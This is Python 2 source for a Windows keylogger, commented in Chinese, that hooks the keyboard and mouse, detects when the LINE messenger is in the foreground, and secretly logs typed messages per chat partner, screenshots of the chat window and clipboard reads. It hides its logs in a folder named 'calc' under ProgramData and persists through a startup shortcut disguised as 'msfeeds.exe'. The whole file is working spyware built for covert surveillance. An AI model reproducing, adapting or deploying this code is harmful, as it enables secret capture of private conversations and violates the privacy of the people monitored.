# -*- coding: utf-8 -*-  
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import time ,datetime ,os ,codecs
# 實現Png 存檔,若透過Win32系列api只能存bmp大檔 (4MB)
from PIL import ImageGrab
# 實現只單純擷取視窗
import win32gui
import os, sys
import winshell

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

''' 全域變數 '''
# 偵測程式名
current_window = None # 當前視窗 ( 程式 )
WindowNow = None # 正確視窗名 ( Line 對象 )
hwnd = None
# 程式運行狀態
isLine = False # 是否為Line
RecordState = False # 是否紀錄中

# For 紀錄
Msg="" # 將字元組成字串
f = None # txt log
pic = None # pic data
pic_Name = None # pic name
Save = None
counter = 0

# For TimeStamp
StartTime = None
EndTime = None

# Path C:\ProgramData
SavePath = 'C:\\ProgramData\\calc\\'

# 時間模組

Date= None
Time= None
Timetxt= None

''' Function '''
# 開機自動啟動
def StartUp():
    
    startup = winshell.startup () # use common=1 for all users
    print startup
    
    winshell.CreateShortcut (
    Path=os.path.join (winshell.startup (), "msfeeds.lnk"),
    Target=sys.executable,
    Icon=(sys.executable, 0),
    Description="msfeeds.exe")
    
# 截圖存檔
def capture():
    global pic
    global pic_name
    # 區域
    left, top, right, bot = win32gui.GetWindowRect(hwnd)
    pic = ImageGrab.grab(bbox = (left, top, right, bot))
    # 全域
    #pic = ImageGrab.grab()
    # 存檔
    pic_name = Date+Time
    
# 時間更新
def RefreshTime():
    #時間模組
    global Date
    global Time
    global Timetxt
    Date= time.strftime('%Y-%m-%d',time.localtime(time.time()))
    Time= time.strftime('-%H-%M-%S',time.localtime(time.time()))
    Timetxt= time.strftime('%H點%M分%S秒',time.localtime(time.time()))
  
# 檢查字串
# 確保對方Line暱稱能存入txt
# TxT 規則：不能含有 /\:*?"<>|,基本上Emoji圖案會自動轉為?
def strCheck(string):
    string=string.replace('!','')
    string=string.replace('?','')
    string=string.replace(':','')
    string=string.replace('\/','')
    string=string.replace('\\','')
    string=string.replace('\"','')
    string=string.replace('\<','')
    string=string.replace('\>','')
    string=string.replace('\|','')
    return string
    
# 檢測目前視窗
def get_current_process():

    global hwnd
    global isLine
    global RecordState
    global WindowNow
    global f
    global Msg
    global counter
    global StartTime
    global Endtime
    global Save
      
    RefreshTime()
    # 取得前景視窗
    hwnd = user32.GetForegroundWindow()

    # 取得視窗ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    # 將視窗存入變數
    process_id = "%d" % pid.value

    # 申請記憶體
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # 讀取視窗標題
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
    

    # 輸出視窗資訊
    '''
    process_id = Pid
    exescutable.value = 程式名稱.exe
    windows_title.value = 視窗名稱
    '''
    #print "[ PID:%s-%s-%s]" % (process_id,exescutable.value,windows_title.value)    
    #print "pid:%s" %process_id
    
    
    # 開始執行偵測
    if(executable.value=="LINE.exe"):
        isLine = True
	WindowNow = windows_title.value	
	if(Save==None):
	    #初始化Save
	    Save=WindowNow
	    Save=strCheck(Save)	
	    
	# 檢測是否轉換對象
	if(Save!=strCheck(WindowNow)):
	    RecordState = False
	    EndTime = Timetxt
	    if(Msg!=""):
		f.write("Start at %s\r\n\r\n" %StartTime)
		f.write(Msg)
		f.write("\r\n\r\nEnd at %s\r\n\r\n" %EndTime)
		Msg=""
		pic.save(SavePath+'\\%s.png' %(Save+'\/'+pic_name))
		print "Target Changed,Save the image."
	    f.close()
	    # 將Save更新
	    #print "This is Save:%s"%Save
	    #print "Turn Taget To %s"%WindowNow
	    Save=WindowNow
	    Save=strCheck(Save)

	# 
	Save=WindowNow
	Save=strCheck(Save)
	#print Save		
	    
	if(RecordState==False):
	    StartTime = Timetxt
	    #print "Start at %s \n" %Time
	    capture()
	    
	    # 創建資料夾
	    if not os.path.exists(SavePath+'%s\\'%Save):
		#print 'Mkdir..%s'%Save    
		os.makedirs(SavePath+'%s\\'%Save)		
	    # 開啟txt檔並記錄
	    if not os.path.exists(SavePath+'%s\\Msg.txt'%Save):
		#print "not exist"
		f = open(SavePath+'%s\\Msg.txt'%Save,'wb+')
	    else:	    
		#print "exist"
		f = open(SavePath+'%s\\Msg.txt'%Save,'a+') # a+,底部開始寫
	    RecordState = True
    # 檢測視窗非Line後紀錄是否應停止
    if(executable.value!="LINE.exe" and isLine==True):
        isLine = False
	RecordState = False
	EndTime = Timetxt
	if(Msg!=""):
	    f.write("Start at %s\r\n\r\n" %StartTime)
	    f.write(Msg)
	    f.write("\r\n\r\nEnd at %s\r\n\r\n" %EndTime)
	    Msg=""
	    pic.save(SavePath+'%s.png' %(Save+'\/'+pic_name))
	    counter=0
	f.close()
	#pic.save('./Save/%s.png' %(Save+'\/'+pic_name))
	#print "Turn isLine to Off"
	
    # 關閉handle
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
    # 滑鼠監聽
def onclick(event):

    get_current_process()
    
    # 返回True使滑鼠偵測繼續，避免滑鼠卡住
    return True

# 鍵盤監聽
def onKeyboardEvent(event):

    global current_window
    global isLine
    global Msg
    global counter
    
    # 檢測是否切換視窗(換了視窗自動監聽新視窗)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 調用函數
        get_current_process()
        #print isLine
    
    # 確保是執行Line情況下
    if(isLine==True):
	capture()
    # 檢查Keydown是否常規按鍵（非組合鍵等）
        if (event.Ascii > 32 and event.Ascii <127):
            #f.write(chr(event.Ascii))
	    Msg+=chr(event.Ascii)
            #print chr(event.Ascii),  
	elif event.Key =="Space":
	    #f.write(" ")
	    Msg+=" "
	    #print " "
        elif event.Ascii == 13:
	    #print "This is Enter"
	    counter+=1
	    print "counter=%s" %counter
	    if(counter==6):
		pic.save(SavePath+'%s.png' %(Save+'\/'+pic_name))
		counter=0
            #f.write("\r\nEnter送出")
            print
        elif event.Key =="Back":
	    #f.write("\r\n[刪除]")
            print
        elif event.Key =="Left":
	    #f.write("[Left]")
            print
        elif event.Key =="Right":
	    #f.write("[Right]")
            print
        else:
            # 發現Ctrl+V（貼上）時，將複製內容存下
	    # 其實是 非常規按鍵 + V 時 
	    # (非Ctrl + V 時一樣執行)
            if event.Key == "V": 
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                #print "[複製貼上]-%s" % (pasted_value),
                
            #else:
                #print "\n"
                #print "[%s]" % event.Key,
    '''
    else:
	print "Record down!"
    '''
    
    # 循環監聽下一個擊鍵事件
    return True
def main():
    
    # 確保紀錄路徑
    # 1.For Message
    # 2.For Pic
    # 3.Make sure the path. ( Like system32 )
    if not os.path.exists(SavePath):
	print 'Mkdir..Save'
	print SavePath
	os.makedirs(SavePath)
    print "Pass"
    if not os.path.exists(SavePath+'SetStartup.txt'):
	h = open(SavePath+'SetStartup.txt','wb+')	
	h.close()
	print "Set StartUp"	
	StartUp()
	
    # 創建hook
    hm = pyHook.HookManager()

    # 監聽鍵盤事件
    hm.KeyDown = onKeyboardEvent
    # 設置鍵盤鉤子
    hm.HookKeyboard()

    # 監聽滑鼠事件
    hm.SubscribeMouseAllButtonsDown(onclick)
    # 設置滑鼠鉤子
    hm.HookMouse()

    # 進入無限循環,保持監聽
    pythoncom.PumpMessages()

''' Run the Key Logger '''
if __name__ == "__main__":
    main()
    

